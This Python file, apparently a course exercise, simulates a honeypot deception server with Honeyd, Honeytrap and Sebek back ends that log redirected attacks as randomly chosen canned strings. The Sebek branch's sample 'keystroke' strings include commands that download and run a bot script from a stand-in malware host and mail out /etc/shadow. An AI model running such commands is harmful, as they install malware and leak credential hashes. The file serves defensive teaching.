# deception_server.py
import random
from dataclasses import dataclass
from typing import List, Dict
from redirector import RedirectResult

@dataclass
class AttackRecord:
    conn_id:       int
    src_ip:        str
    server_type:   str
    dst_ip:        str
    attack_payload: str
    ttl_received:  int
    captured_info: str
    timestamp:     float

class DeceptionServer:
    """
    Mô phỏng 3 máy chủ đánh lừa theo Chương 13:

    1. Honeyd    - Low interaction, giả lập OS/services
    2. Honeytrap - Bắt shellcode và exploit
    3. Sebek     - High interaction, ghi lại keystroke
    """

    SERVERS = {
        "honeyd": {
            "ip":   "192.168.1.100",
            "type": "Low Interaction",
            "os":   "Windows XP SP2 (simulated)",
            "desc": "Honeyd - giả lập OS và dịch vụ",
        },
        "honeytrap": {
            "ip":   "192.168.1.101",
            "type": "Low Interaction",
            "os":   "Linux 2.6 (simulated)",
            "desc": "Honeytrap - bắt shellcode/exploit",
        },
        "sebek": {
            "ip":   "192.168.1.102",
            "type": "High Interaction",
            "os":   "Linux Ubuntu 8.04 (real)",
            "desc": "Sebek - ghi lại toàn bộ keystroke",
        },
    }

    def __init__(self):
        self.records: List[AttackRecord] = []
        self.import_time = __import__('time')

    def _get_server_type(self, dst_ip: str) -> str:
        for name, info in self.SERVERS.items():
            if info["ip"] == dst_ip:
                return name
        return "unknown"

    def _capture_attack_info(self,
                             server_type: str,
                             payload: str) -> str:
        """Mô phỏng thông tin thu thập theo loại server"""
        if server_type == "honeyd":
            responses = [
                "Simulated HTTP 200 OK → logged request headers",
                "Simulated FTP 220 → captured login attempt",
                "Simulated SSH banner → recorded client version",
                "Simulated SMB → captured NTLM hash attempt",
            ]
            return random.choice(responses)

        elif server_type == "honeytrap":
            responses = [
                "Shellcode captured: 45 bytes extracted",
                "Exploit payload stored: CVE-2021-XXXX pattern",
                "Reverse shell attempt: attacker IP confirmed",
                "Buffer overflow pattern: saved to pcap",
            ]
            return random.choice(responses)

        else:  # sebek
            responses = [
                "Keystrokes logged: 'wget http://malware.com/bot.sh'",
                "Keystrokes logged: 'chmod +x bot.sh && ./bot.sh'",
                "Keystrokes logged: 'cat /etc/shadow | mail attacker'",
                "System calls traced: execve('/bin/sh') detected",
                "File access logged: /etc/passwd read attempt",
            ]
            return random.choice(responses)

    def receive(self,
                redirect_results: List[RedirectResult],
                original_connections) -> List[AttackRecord]:
        """
        Nhận các kết nối được chuyển hướng L3
        và ghi lại thông tin tấn công
        """
        conn_map = {c.conn_id: c
                    for c in original_connections}

        for result in redirect_results:
            if not result.redirect_type.startswith("L3"):
                continue

            server_type = self._get_server_type(result.final_dst)
            orig_conn   = conn_map.get(result.conn_id)
            payload     = orig_conn.payload if orig_conn else "unknown"

            captured = self._capture_attack_info(server_type, payload)

            record = AttackRecord(
                conn_id        = result.conn_id,
                src_ip         = result.src_ip,
                server_type    = server_type,
                dst_ip         = result.final_dst,
                attack_payload = payload,
                ttl_received   = result.ttl_modified,
                captured_info  = captured,
                timestamp      = result.latency_ms,
            )
            self.records.append(record)

        by_server = {}
        for r in self.records:
            by_server[r.server_type] = \
                by_server.get(r.server_type, 0) + 1
        print(f"[Deception] Captured {len(self.records)} attacks | "
              f"{by_server}")
        return self.records